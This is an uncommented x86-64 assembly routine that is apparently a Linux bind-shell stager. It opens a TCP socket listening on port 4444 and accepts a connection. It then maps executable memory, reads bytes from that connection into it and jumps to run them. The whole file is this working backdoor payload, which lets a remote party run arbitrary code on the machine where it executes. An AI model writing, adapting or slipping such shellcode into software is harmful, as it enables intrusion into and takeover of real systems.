.global __asm_action

__asm_action:
    pushq $0x29
    popq %rax
    cdq
    pushq $0x2
    popq %rdi
    pushq $0x1
    popq %rsi
    syscall
    xchg %rax, %rdi
    pushq %rdx
    movq $0x5c110002, (%rsp)
    movq %rsp, %rsi
    pushq $0x10
    popq %rdx
    pushq $0x31
    popq %rax
    syscall
    popq %rcx
    pushq $0x32
    popq %rax
    syscall
    xchg %rax, %rsi
    pushq $0x2b
    popq %rax
    syscall
    pushq %rax
    pushq %rsi
    popq %rdi
    pushq $0x9
    popq %rax
    cdq
    movb $0x10, %dh
    movq %rsi, %rdx
    xorq %r9, %r9
    pushq $0x22
    popq %r10
    movb $0x7, %dl
    syscall
    xchg %rax, %rsi
    xchg %rax, %rdi
    popq %rdi
    syscall
    jmp *%rsi
